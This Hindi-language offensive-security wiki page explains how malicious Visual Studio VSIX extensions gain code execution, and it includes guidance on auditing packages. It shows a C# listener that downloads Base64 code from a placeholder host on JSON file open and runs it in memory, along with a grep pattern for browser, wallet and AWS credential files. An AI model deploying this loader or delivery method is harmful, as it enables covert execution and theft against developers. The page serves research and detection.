# Visual Studio VSIX Extension का दुरुपयोग

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension, लॉग-इन उपयोगकर्ता की पहचान के तहत सामान्य editor गतिविधि को code execution में बदल सकता है। कोई malicious VSIX, मिलता-जुलता publisher, या compromised extension update सामान्य installation channels के ज़रिए उस उपयोगकर्ता तक पहुँच सकता है। Administrator prompt के साथ installation, सहमति से किया गया install path है—automatic privilege escalation नहीं।<sup>[[1]](#references)</sup>

## निष्पादन मॉडल

Classic VSSDK extensions आमतौर पर `devenv.exe` के अंदर execute होते हैं। नया `VisualStudio.Extensibility` मॉडल मुख्य रूप से आधुनिक .NET extensions को out of process चलाता है: Visual Studio calls को एक समर्पित `Microsoft.ServiceHub.Host.Extensibility` process तक पहुँचाता है। इससे IDE की stability अलग रहती है, लेकिन extension को उपयोगकर्ता की Windows permissions से **sandbox नहीं किया जाता**। Executable के नाम में architecture suffix शामिल हो सकता है, जैसे `ServiceHub.Host.Extensibility.arm64.exe`।<sup>[[1]](#references)[[2]](#references)</sup>

### सामान्य editor गतिविधि पर trigger करना

केवल स्पष्ट menu command देने के बजाय, extension `ITextViewOpenClosedListener` implement कर सकता है। इसका `TextViewOpenedAsync` callback मेल खाने वाले documents के लिए invoke होता है, जबकि `TextViewExtensionConfiguration.AppliesTo` activation को JSON जैसे सामान्य type तक सीमित कर सकता है। कोई वास्तविक formatter या linter अपना घोषित काम करते हुए भी file खोलने पर side effect के रूप में दूसरी कार्रवाई चला सकता है।<sup>[[1]](#references)[[3]](#references)</sup>

नीचे दिया गया संक्षिप्त pattern महत्वपूर्ण execution points दिखाता है; स्पष्टता के लिए इसमें वैध formatter और error handling शामिल नहीं हैं।<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Event-triggered in-memory managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

यह chain Base64 text डाउनलोड करती है, उसे assembly bytes में decode करती है, `MemoryStream` से collectible `AssemblyLoadContext` के ज़रिए load करती है, reflected `EntryPoint` को बिना parameters या `string[]` के invoke करती है, asynchronous entry points को await करती है, और context को unload करती है। दूसरा stage disk पर नहीं लिखा जाता, हालांकि VSIX और primary extension DLL disk artefacts बने रहते हैं। Base64 authenticity या confidentiality प्रदान नहीं करता; HTTP का उपयोग on-path attacker को response बदलने की अनुमति भी देता है।<sup>[[1]](#references)</sup>

Operational variations में staging विफल होने पर advertised feature को जारी रखने के लिए सभी exceptions को suppress करना, या edits के बाद trigger करने के लिए `ITextViewChangedListener` का उपयोग करना शामिल है। Code extension host में execute होता है और उस user के लिए उपलब्ध managed APIs, P/Invoke, files, credentials और child processes का उपयोग कर सकता है।<sup>[[1]](#references)</sup>

Native plugin autoloading पर आधारित editor-specific execution surface के लिए देखें:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace और delivery trust का दुरुपयोग

VSIX सीधे साझा की गई/phished file के रूप में, web Marketplace से, या Visual Studio के embedded Marketplace browser के ज़रिए आ सकती है। Publisher registration, जो मुख्यतः uniqueness और reserved-word list लागू करती है, देखने में suggestive publisher identities की अनुमति दे सकती है; पहले से trusted publisher या extension को compromise करना और भी प्रभावी है, क्योंकि उसे installed user base विरासत में मिलता है। Marketplace installation Visual Studio Installer को invoke करती है और डाउनलोड की गई VSIX को अस्थायी रूप से `%LOCALAPPDATA%\Temp` में रखती है; `payload.vsix` का वैध रूप से भी उपयोग होता है, इसलिए केवल filename कोई indicator नहीं है।<sup>[[1]](#references)</sup>

MDSec को ऐसा Visual Studio URL protocol नहीं मिला जो सीधे extension install करता हो। Operator को अब भी user से VSIX install/trust करवाना होगा, या किसी मौजूदा extension के distribution path को compromise करना होगा। `AllUsers` package Visual Studio installation folder में install होता है और elevation का अनुरोध कर सकता है, लेकिन यह सामान्य सहमति-आधारित installer behavior है, administrator या SYSTEM तक पहुँचने का कोई automatic रास्ता नहीं।<sup>[[1]](#references)[[4]](#references)</sup>

### बड़े पैमाने पर static auditing

VSIX packages आमतौर पर ZIP containers होते हैं, इसलिए एक सुरक्षित marketplace-review pipeline packages की सूची बना सकती है, extension code **लोड किए बिना** उन्हें unpack कर सकती है, manifests parse कर सकती है, executable surfaces की पहचान कर सकती है, और `ilspycmd` से managed assemblies decompile कर सकती है। सामान्य bundled dependencies को हटाने के बाद extension की अपनी assemblies को प्राथमिकता दें, फिर credential-store strings को ऐसे behavioral clusters के साथ correlate करें: file-read के साथ network-send, encode के साथ send, download के साथ execution, credential-manager के साथ network access, या screenshot के साथ send।<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

साथ ही native DLLs, MSBuild targets, scripts, T4 templates और installer payloads की भी inventory करें—यह न मानें कि execution की हर सतह managed code है। संदिग्ध व्यवहार की तुलना manifest में बताए गए उद्देश्य से करें; telemetry और वैध updaters, exfiltration या staging जैसे लग सकते हैं। केवल static review करने पर packed, obfuscated, dynamically resolved और dormant code छूट सकता है। केवल नवीनतम version की समीक्षा करने पर पुराने malicious releases छूट सकते हैं।<sup>[[1]](#references)</sup>

VS Code एक अलग extension host और manifest का उपयोग करता है। ऐसे writable share के लिए, जो VS Code extension के automated install को feed करता है, देखें [VS Code extension drop-share execution](vscode-extension-abuse.md)।

एक अलग project-load attack, VSIX install किए बिना malicious [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) execute कर सकता है।<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Extensions पर पुनर्विचार](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility के बारे में](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX package की संरचना](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET tool](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel अभियान ने इराकी infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
